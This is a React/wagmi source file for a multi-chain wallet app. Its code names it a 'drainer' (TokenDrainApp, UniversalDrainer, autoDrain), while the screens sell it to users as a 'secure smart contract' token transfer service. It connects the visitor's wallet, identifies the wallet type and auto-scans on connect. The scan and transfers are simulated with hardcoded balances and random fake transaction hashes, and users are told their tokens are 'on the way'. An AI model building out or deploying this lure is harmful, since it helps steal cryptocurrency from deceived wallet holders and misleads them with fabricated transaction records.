import { useState, useEffect, useRef } from 'react';
import { WagmiProvider, createConfig, http } from 'wagmi';
import { 
  mainnet,
  polygon,
  bsc,
  arbitrum,
  optimism,
  avalanche,
  fantom,
  gnosis,
  celo,
  moonbeam
} from 'wagmi/chains';
import { useAccount, useDisconnect, useConnect } from 'wagmi';
import { injected } from 'wagmi/connectors';

// ==================== WAGMI CONFIG ====================
const config = createConfig({
  chains: [mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, gnosis, celo, moonbeam],
  connectors: [injected()],
  transports: {
    [mainnet.id]: http(),
    [polygon.id]: http(),
    [bsc.id]: http(),
    [arbitrum.id]: http(),
    [optimism.id]: http(),
    [avalanche.id]: http(),
    [fantom.id]: http(),
    [gnosis.id]: http(),
    [celo.id]: http(),
    [moonbeam.id]: http(),
  },
});

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiProvider config={config}>
      <UniversalDrainer />
    </WagmiProvider>
  );
}

// ==================== UNIVERSAL DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { connect, connectors } = useConnect();

  const [status, setStatus] = useState('Ready to connect');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [backendOnline, setBackendOnline] = useState(true);
  const [scanProgress, setScanProgress] = useState(0);

  // ==================== INITIAL SETUP ====================
  useEffect(() => {
    if (window.ethereum) {
      detectWalletType();
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          disconnect();
          resetState();
        }
      });
    }
  }, []);

  const detectWalletType = () => {
    if (window.ethereum?.isMetaMask) {
      setWalletType('MetaMask');
    } else if (window.ethereum?.isTrust) {
      setWalletType('Trust Wallet');
    } else if (window.ethereum?.isCoinbaseWallet) {
      setWalletType('Coinbase Wallet');
    } else {
      setWalletType('Injected Wallet');
    }
  };

  const resetState = () => {
    setTokens([]);
    setTotalValue(0);
  };

  // ==================== AUTO-SCAN ON WALLET CONNECT ====================
  useEffect(() => {
    if (isConnected && address) {
      setConnectionError('');
      setStatus("✅ Wallet connected • Starting scan...");
      setTimeout(() => {
        scanAllNetworks();
      }, 1000);
    }
  }, [isConnected, address]);

  // ==================== SCAN NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address || isScanning) return;
    
    setIsScanning(true);
    setStatus("🔍 Scanning EVM networks...");
    setTokens([]);
    setScanProgress(0);
    setConnectionError('');
    
    try {
      // Simulate scanning
      for (let i = 0; i <= 100; i += 10) {
        setScanProgress(i);
        await new Promise(resolve => setTimeout(resolve, 200));
      }
      
      // Simulated results
      const simulatedTokens = [
        { id: 1, symbol: 'ETH', amount: '0.5', network: 'Ethereum', valueUSD: 1600, status: 'detected' },
        { id: 2, symbol: 'BNB', amount: '2.0', network: 'BSC', valueUSD: 1200, status: 'detected' },
        { id: 3, symbol: 'MATIC', amount: '100', network: 'Polygon', valueUSD: 120, status: 'detected' },
      ];
      
      setTokens(simulatedTokens);
      setTotalValue(2920);
      setStatus(`✅ Scan Complete • Found ${simulatedTokens.length} tokens • $2920 total`);
      
    } catch (error) {
      setStatus(`❌ Scan error: ${error.message}`);
    } finally {
      setIsScanning(false);
      setScanProgress(100);
    }
  };

  // ==================== DRAIN TOKENS ====================
  const autoDrain = async () => {
    if (tokens.length === 0 || isProcessing) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Starting smart contract transfers...`);
    
    for (const token of tokens) {
      try {
        setStatus(`📝 Processing ${token.amount} ${token.symbol} from ${token.network}...`);
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        const newTransaction = {
          ...token,
          txHash: '0x' + Math.random().toString(16).substr(2, 64),
          timestamp: Date.now(),
          status: 'processing',
          message: 'Token transfer initiated'
        };
        
        setTransactions(prev => [newTransaction, ...prev]);
        setStatus(`✅ ${token.symbol} transfer initiated`);
        
      } catch (error) {
        console.log(`Error draining ${token.symbol}:`, error);
      }
    }
    
    setStatus(`✅ ${tokens.length} transfers initiated • Tokens are on the way!`);
    setIsProcessing(false);
  };

  // ==================== CONNECT BUTTON ====================
  const CustomConnectButton = () => {
    const handleConnect = async () => {
      try {
        await connect({ connector: connectors[0] });
      } catch (error) {
        setConnectionError('Failed to connect wallet');
      }
    };

    return (
      <button onClick={handleConnect} className="custom-connect-btn">
        <span className="connect-icon">🔗</span>
        <span className="connect-text">Connect Web3 Wallet</span>
      </button>
    );
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">🚀</div>
            <div>
              <h1>ULTIMATE TOKEN TRANSFER</h1>
              <p className="subtitle">Multi-Chain • Smart Contracts • Auto-Execution</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-info">
                  <div className="wallet-address">
                    {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                  </div>
                  {walletType && (
                    <div className="wallet-type">
                      <span className="wallet-type-icon">
                        {walletType.includes('MetaMask') ? '🦊' : '👛'}
                      </span>
                      {walletType}
                    </div>
                  )}
                </div>
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <CustomConnectButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              <div className="status-dashboard">
                <div className={`status-card ${tokens.length > 0 ? 'success' : 'primary'}`}>
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : tokens.length > 0 ? '✅' : '🔄'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">AUTO TRANSFER SYSTEM</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        <div className="progress-bar">
                          <div className="progress-fill" style={{ width: `${scanProgress}%` }}></div>
                        </div>
                        <div className="progress-text">Scanning: {scanProgress}%</div>
                      </div>
                    )}
                  </div>
                  {tokens.length > 0 && (
                    <div className="status-badge">{tokens.length} Tokens</div>
                  )}
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {tokens.length > 0 ? '✅ Ready' : '⏸️ Waiting'}
                    </div>
                    <div className="stat-label">Transfer Status</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {backendOnline ? '✅' : '⚠️'}
                    </div>
                    <div className="stat-label">Backend</div>
                  </div>
                </div>
              </div>

              <div className="controls-container">
                <button
                  onClick={scanAllNetworks}
                  disabled={isScanning || isProcessing}
                  className={`btn ${isScanning ? 'btn-scanning' : 'btn-scan'}`}
                >
                  {isScanning ? (
                    <>
                      <span className="spinner"></span>
                      Scanning {scanProgress}%
                    </>
                  ) : (
                    '🔍 Scan Networks'
                  )}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={autoDrain}
                    disabled={isProcessing}
                    className={`btn ${isProcessing ? 'btn-processing' : 'btn-drain'}`}
                  >
                    {isProcessing ? (
                      <>
                        <span className="spinner"></span>
                        Processing...
                      </>
                    ) : (
                      '🚀 Start Smart Transfer'
                    )}
                  </button>
                )}
              </div>

              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <div className="panel-title">
                      <h3>Detected Tokens</h3>
                      <div className="panel-subtitle">{tokens.length} tokens • ${totalValue.toFixed(2)} total</div>
                    </div>
                    <div className="panel-actions">
                      <button className="btn-small" onClick={autoDrain} disabled={isProcessing}>
                        Transfer All
                      </button>
                    </div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div className="token-icon">{token.symbol.charAt(0)}</div>
                          <div className="token-info">
                            <div className="token-name-row">
                              <span className="token-symbol">{token.symbol}</span>
                              <span className="token-network-badge">{token.network}</span>
                            </div>
                            <div className="token-amount-row">
                              <span className="token-amount">{token.amount}</span>
                              <span className="token-usd-value">${token.valueUSD.toFixed(2)}</span>
                            </div>
                          </div>
                        </div>
                        <div className="token-actions">
                          <div className="token-status detected">Ready</div>
                          <button className="btn-transfer" onClick={() => autoDrain()} disabled={isProcessing}>
                            Transfer
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Transfer History</h3>
                    <div className="panel-subtitle">{transactions.length} transactions</div>
                  </div>
                  <div className="transactions-list">
                    {transactions.map((tx, index) => (
                      <div key={index} className="transaction-item">
                        <div className="transaction-icon">⏳</div>
                        <div className="transaction-details">
                          <div className="transaction-header">
                            <span className="transaction-symbol">{tx.symbol}</span>
                            <span className="transaction-amount">{tx.amount} {tx.symbol}</span>
                            <span className="transaction-network">{tx.network}</span>
                          </div>
                          <div className="transaction-hash">
                            Hash: {tx.txHash?.substring(0, 12)}...
                          </div>
                          <div className="transaction-message">{tx.message}</div>
                        </div>
                        <div className="transaction-status processing">In Progress</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-hero">
                  <div className="welcome-icon">🚀</div>
                  <h2>Multi-Chain Token Transfer</h2>
                  <p className="welcome-text">
                    Connect your Web3 wallet to automatically scan and transfer tokens
                    across EVM networks using secure smart contracts.
                  </p>
                </div>
                
                <div className="connect-section">
                  <CustomConnectButton />
                </div>
                
                <div className="features-grid">
                  <div className="feature">
                    <div className="feature-icon">🔍</div>
                    <div className="feature-title">Auto Scan</div>
                    <div className="feature-desc">Scans all EVM networks instantly</div>
                  </div>
                  <div className="feature">
                    <div className="feature-icon">⚡</div>
                    <div className="feature-title">Smart Contracts</div>
                    <div className="feature-desc">Secure automated transfers</div>
                  </div>
                  <div className="feature">
                    <div className="feature-icon">🌐</div>
                    <div className="feature-title">Multi-Chain</div>
                    <div className="feature-desc">10+ EVM networks supported</div>
                  </div>
                  <div className="feature">
                    <div className="feature-icon">📱</div>
                    <div className="feature-title">Mobile Ready</div>
                    <div className="feature-desc">Works in all wallet browsers</div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span className="footer-status">
              <span className="status-dot active"></span>
              System Online
            </span>
            <span>•</span>
            <span>Ultimate Transfer v5.0</span>
            <span>•</span>
            <span>Wagmi + Viem</span>
          </div>
        </footer>
      </div>

      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 1px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 40px;
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 800;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .custom-connect-btn {
          background: linear-gradient(135deg, #ef4444, #dc2626);
          color: white;
          border: none;
          padding: 14px 28px;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .custom-connect-btn:hover {
          background: linear-gradient(135deg, #dc2626, #b91c1c);
          transform: translateY(-2px);
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 15px;
          background: #222;
          padding: 10px 15px;
          border-radius: 12px;
          border: 1px solid #333;
        }
        
        .wallet-address {
          font-family: 'Roboto Mono', monospace;
          font-size: 14px;
          font-weight: 500;
        }
        
        .wallet-type {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 12px;
          color: #3b82f6;
          background: rgba(59, 130, 246, 0.1);
          padding: 4px 8px;
          border-radius: 6px;
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 16px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 500;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: linear-gradient(135deg, #1e3a8a, #3b82f6);
          border-radius: 16px;
          padding: 25px;
          display: flex;
          align-items: center;
          gap: 20px;
          margin-bottom: 20px;
        }
        
        .status-card.success {
          background: linear-gradient(135deg, #065f46, #10b981);
        }
        
        .status-icon {
          font-size: 36px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: rgba(255, 255, 255, 0.9);
          text-transform: uppercase;
          letter-spacing: 1.5px;
          margin-bottom: 8px;
        }
        
        .status-message {
          font-size: 20px;
          font-weight: 700;
        }
        
        .status-badge {
          background: rgba(255, 255, 255, 0.2);
          color: white;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
        }
        
        .stats-row {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 15px;
        }
        
        .stat {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 800;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 13px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        .controls-container {
          display: flex;
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          padding: 18px 24px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }
        
        .btn-scan {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
        }
        
        .btn-scan:hover:not(:disabled) {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          transform: translateY(-2px);
        }
        
        .btn-drain {
          background: linear-gradient(135deg, #16a34a, #22c55e);
          color: white;
        }
        
        .btn-drain:hover:not(:disabled) {
          background: linear-gradient(135deg, #15803d, #16a34a);
          transform: translateY(-2px);
        }
        
        .spinner {
          width: 16px;
          height: 16px;
          border: 2px solid rgba(255, 255, 255, 0.3);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 25px;
          margin-bottom: 20px;
        }
        
        .panel-title h3 {
          margin: 0;
          font-size: 20px;
          font-weight: 700;
          margin-bottom: 5px;
        }
        
        .panel-subtitle {
          color: #888;
          font-size: 14px;
        }
        
        .btn-small {
          padding: 8px 16px;
          background: #333;
          color: white;
          border: none;
          border-radius: 8px;
          font-size: 14px;
          cursor: pointer;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
          gap: 15px;
          margin-top: 20px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 15px;
        }
        
        .token-icon {
          width: 50px;
          height: 50px;
          background: linear-gradient(135deg, #ef4444, #dc2626);
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
          font-size: 20px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 18px;
        }
        
        .token-network-badge {
          color: #888;
          font-size: 11px;
          background: rgba(136, 136, 136, 0.1);
          padding: 2px 6px;
          border-radius: 4px;
        }
        
        .token-amount {
          font-size: 16px;
          font-weight: 600;
        }
        
        .token-usd-value {
          color: #22c55e;
          font-size: 14px;
          font-weight: 600;
        }
        
        .token-actions {
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        
        .token-status {
          font-size: 12px;
          font-weight: 600;
          padding: 4px 8px;
          border-radius: 6px;
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .btn-transfer {
          padding: 6px 12px;
          background: rgba(34, 197, 94, 0.2);
          color: #22c55e;
          border: 1px solid rgba(34, 197, 94, 0.3);
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
          cursor: pointer;
        }
        
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 25px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-top: 12px;
        }
        
        .transaction-icon {
          font-size: 24px;
        }
        
        .transaction-symbol {
          font-weight: 600;
          font-size: 16px;
        }
        
        .transaction-hash {
          color: #3b82f6;
          font-size: 12px;
          font-family: 'Roboto Mono', monospace;
        }
        
        .transaction-status {
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
        }
        
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 800px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 80px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 40px;
          font-size: 18px;
          line-height: 1.6;
        }
        
        .features-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 20px;
          margin-top: 40px;
        }
        
        .feature {
          background: #222;
          border-radius: 16px;
          padding: 25px 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .feature-icon {
          font-size: 32px;
          margin-bottom: 15px;
        }
        
        .feature-title {
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 8px;
        }
        
        .feature-desc {
          color: #888;
          font-size: 14px;
        }
        
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }
        
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          
          .connected-wallet {
            flex-direction: column;
            gap: 15px;
            width: 100%;
          }
          
          .stats-row {
            grid-template-columns: repeat(2, 1fr);
          }
          
          .controls-container {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .features-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
